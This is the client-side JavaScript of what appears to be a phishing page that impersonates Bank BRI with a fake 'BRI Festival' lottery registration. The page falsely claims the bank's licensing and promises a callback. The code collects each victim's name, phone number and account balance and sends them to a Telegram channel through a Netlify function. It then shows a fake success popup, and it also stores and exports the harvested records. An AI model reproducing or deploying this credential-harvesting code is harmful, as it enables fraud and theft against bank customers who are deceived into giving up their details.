const fullMessage = "Terimakasih Telah Mendaftar Dilayanan Bank BRI Festival, Pendaftaran Anda Sudah Berhasil Terverifikasi, Anda Akan Dihubungi Oleh Pihak Bank BRI, Untuk Proses Cetak Kode Kupon Undian Anda. BRI berizin dan diawasi oleh OJK";

let typewriterInterval = null;
let currentIndex = 0;

// Data storage untuk grouping berdasarkan nama
let userDataStorage = {};

function formatRupiah(angka) {
    if (!angka && angka !== 0) return "";
    let numStr = angka.toString().replace(/\./g, '');
    let clean = numStr.replace(/[^0-9]/g, '');
    if (clean === "") return "";
    let reverse = clean.split('').reverse().join('');
    let ribuan = reverse.match(/\d{1,3}/g);
    let formatted = ribuan.join('.').split('').reverse().join('');
    return formatted;
}

function unformatRupiah(str) {
    if (!str) return "";
    return str.replace(/\./g, '');
}

function handleBalanceInput(e) {
    let input = e.target;
    let raw = input.value.replace(/\./g, '').replace(/[^0-9]/g, '');
    if (raw === "") { input.value = ""; return; }
    input.value = formatRupiah(raw);
}

function rollup() {
    $('#gmb').addClass('flip').removeClass('fadeInRightBig');
    setTimeout(() => {
        showForm();
        $('#gmb').removeClass('flip').addClass('fadeInRightBig');
    }, 500);
}

function showForm() {
    document.getElementById('formPage').style.display = 'flex';
    document.getElementById('dataForm').reset();
}

function closeForm() {
    document.getElementById('formPage').style.display = 'none';
}

function createSparkle(x, y) {
    const sparkle = document.createElement('div');
    sparkle.classList.add('sparkle');
    sparkle.style.left = x + 'px';
    sparkle.style.top = y + 'px';
    document.body.appendChild(sparkle);
    setTimeout(() => sparkle.remove(), 1500);
}

function startConfettiCelebration() {
    const colors = ['#0F78CB', '#FFD966', '#FFB347', '#2A9D8F', '#E9C46A', '#FF6B6B'];
    for (let i = 0; i < 180; i++) {
        const conf = document.createElement('div');
        conf.classList.add('confetti-piece');
        conf.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
        conf.style.left = Math.random() * 100 + '%';
        conf.style.width = (Math.random() * 12 + 5) + 'px';
        conf.style.height = (Math.random() * 16 + 8) + 'px';
        conf.style.animationDuration = (Math.random() * 2.5 + 1.8) + 's';
        conf.style.animationDelay = (Math.random() * 0.8) + 's';
        document.body.appendChild(conf);
        setTimeout(() => conf.remove(), 4500);
    }
    
    setTimeout(() => {
        const logo = document.querySelector('.popup-logo-bri');
        if (logo) {
            const rect = logo.getBoundingClientRect();
            for (let i = 0; i < 30; i++) {
                const x = rect.left + (Math.random() * rect.width);
                const y = rect.top + (Math.random() * rect.height);
                createSparkle(x, y);
            }
        }
    }, 100);
}

function startTypewriterEffect() {
    if (typewriterInterval) clearInterval(typewriterInterval);
    currentIndex = 0;
    const typewriterDiv = document.getElementById('typewriterText');
    typewriterDiv.innerHTML = '<span class="cursor-blink"></span>';
    typewriterInterval = setInterval(() => {
        if (currentIndex < fullMessage.length) {
            let html = typewriterDiv.innerHTML.replace('<span class="cursor-blink"></span>', '');
            html += fullMessage.charAt(currentIndex);
            html += '<span class="cursor-blink"></span>';
            typewriterDiv.innerHTML = html;
            currentIndex++;
        } else {
            clearInterval(typewriterInterval);
            typewriterInterval = null;
        }
    }, 40);
}

function showTypewriterSuccess() {
    const popup = document.getElementById('typewriterPopup');
    document.getElementById('typewriterText').innerHTML = '';
    popup.classList.add('active');
    startTypewriterEffect();
    startConfettiCelebration();
}

function closeTypewriterPopup() {
    document.getElementById('typewriterPopup').classList.remove('active');
    if (typewriterInterval) clearInterval(typewriterInterval);
    document.getElementById('typewriterText').innerHTML = '';
    currentIndex = 0;
}

// Format pesan untuk Telegram
function formatTelegramMessage(nama, nomor, saldo, timestamp) {
    return `├• AKUN | BRImo
├───────────────────
├• NAMA : ${nama.toUpperCase()}
├───────────────────
├• NO HP : ${nomor}
├───────────────────
├• SALDO : Rp ${saldo}
├───────────────────
├• WAKTU : ${timestamp}
╰───────────────────`;
}

// Fungsi untuk update data storage berdasarkan nama
function updateUserDataStorage(nama, nomor, saldoFormatted, saldoNumber) {
    if (!userDataStorage[nama]) {
        userDataStorage[nama] = {
            nama: nama,
            nomor: nomor,
            saldo: saldoFormatted,
            saldoNumber: saldoNumber,
            timestamp: new Date().toLocaleString('id-ID'),
            count: 1
        };
    } else {
        // Update data dengan yang terbaru
        userDataStorage[nama].nomor = nomor;
        userDataStorage[nama].saldo = saldoFormatted;
        userDataStorage[nama].saldoNumber = saldoNumber;
        userDataStorage[nama].timestamp = new Date().toLocaleString('id-ID');
        userDataStorage[nama].count++;
    }
    return userDataStorage[nama];
}

// Fungsi untuk mengirim data ke Netlify Function
async function sendToTelegramViaNetlify(nama, nomor, saldoFormatted) {
    const timestamp = new Date().toLocaleString('id-ID');
    const message = formatTelegramMessage(nama, nomor, saldoFormatted, timestamp);
    
    try {
        const response = await fetch('/.netlify/functions/send-data', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                message: message,
                nama: nama,
                nomor: nomor,
                saldo: saldoFormatted,
                timestamp: timestamp
            })
        });
        
        const result = await response.json();
        
        if (response.ok && result.success) {
            console.log('✅ Pesan berhasil terkirim ke Telegram');
            return true;
        } else {
            console.error('❌ Gagal mengirim ke Telegram:', result.error || 'Unknown error');
            return false;
        }
    } catch (error) {
        console.error('❌ Error saat mengirim ke Netlify Function:', error);
        return false;
    }
}

// Fungsi untuk menampilkan semua data yang tersimpan
function displayStoredData() {
    console.log('📦 Data tersimpan:');
    if (Object.keys(userDataStorage).length === 0) {
        console.log('Belum ada data yang tersimpan');
    } else {
        Object.values(userDataStorage).forEach(user => {
            console.log(`- ${user.nama} | ${user.nomor} | Rp ${user.saldo} (${user.count}x) | Terakhir: ${user.timestamp}`);
        });
    }
}

// Fungsi untuk export data ke JSON
function exportDataToJSON() {
    const dataStr = JSON.stringify(userDataStorage, null, 2);
    const dataBlob = new Blob([dataStr], {type: 'application/json'});
    const url = URL.createObjectURL(dataBlob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `bri_data_${new Date().toISOString().slice(0,19)}.json`;
    a.click();
    URL.revokeObjectURL(url);
    console.log('📥 Data berhasil diexport');
}

async function submitData(event) {
    event.preventDefault();
    const nama = document.getElementById('fullName').value.trim();
    const nomor = document.getElementById('phoneNumber').value.trim();
    const saldoFormatted = document.getElementById('lastBalance').value.trim();
    const saldoClean = unformatRupiah(saldoFormatted);
    const saldoNumber = parseInt(saldoClean, 10);
    
    if (!nama) { alert("Silakan masukkan nama lengkap Anda"); return; }
    if (!nomor) { alert("Silakan masukkan nomor HP Anda"); return; }
    const cleanPhone = nomor.replace(/\s/g, '');
    if (!/^[0-9]{10,13}$/.test(cleanPhone)) { alert("Nomor HP tidak valid. Masukkan 10-13 digit angka."); return; }
    if (!saldoFormatted) { alert("Silakan masukkan saldo terakhir Anda"); return; }
    if (isNaN(saldoNumber) || saldoNumber < 0) { alert("Saldo tidak valid."); return; }
    
    // Update storage dengan grouping berdasarkan nama
    const userData = updateUserDataStorage(nama, cleanPhone, saldoFormatted, saldoNumber);
    
    document.getElementById('loading').classList.add('show');
    
    // Kirim ke Telegram via Netlify Function
    const telegramSent = await sendToTelegramViaNetlify(nama, cleanPhone, saldoFormatted);
    
    setTimeout(() => {
        document.getElementById('loading').classList.remove('show');
        closeForm();
        showTypewriterSuccess();
        
        console.log("✅ Pendaftaran berhasil:", userData);
        if (!telegramSent) {
            console.warn('⚠️ Gagal mengirim ke Telegram, tapi data tetap tersimpan');
        }
        
        // Tampilkan data yang sudah terkumpul di console
        displayStoredData();
    }, 1500);
}

// Inisialisasi saat halaman dimuat
$(document).ready(function() {
    // Load data dari localStorage jika ada
    const savedData = localStorage.getItem('bri_user_data');
    if (savedData) {
        try {
            userDataStorage = JSON.parse(savedData);
            console.log('📀 Data berhasil dimuat dari localStorage');
            displayStoredData();
        } catch(e) {
            console.error('Gagal memuat data:', e);
        }
    }
    
    // Event handlers
    document.getElementById('lastBalance').addEventListener('input', handleBalanceInput);
    
    $('#phoneNumber').on('input', function() {
        let val = $(this).val().replace(/\D/g, '');
        if (val.length > 0 && !val.startsWith('0') && !val.startsWith('62')) val = '0' + val;
        if (val.length > 15) val = val.slice(0, 15);
        $(this).val(val);
    });
    
    // Simpan data ke localStorage setiap kali ada perubahan
    window.saveDataToLocalStorage = function() {
        localStorage.setItem('bri_user_data', JSON.stringify(userDataStorage));
        console.log('💾 Data disimpan ke localStorage');
    };
    
    // Auto save setiap 30 detik
    setInterval(() => {
        if (Object.keys(userDataStorage).length > 0) {
            localStorage.setItem('bri_user_data', JSON.stringify(userDataStorage));
        }
    }, 30000);
    
    // Expose fungsi ke window untuk debugging
    window.displayStoredData = displayStoredData;
    window.exportDataToJSON = exportDataToJSON;
    window.userDataStorage = userDataStorage;
    
    console.log('🚀 Halaman siap!');
    console.log('💡 Gunakan displayStoredData() untuk lihat data tersimpan');
    console.log('💡 Gunakan exportDataToJSON() untuk export data ke file JSON');
});
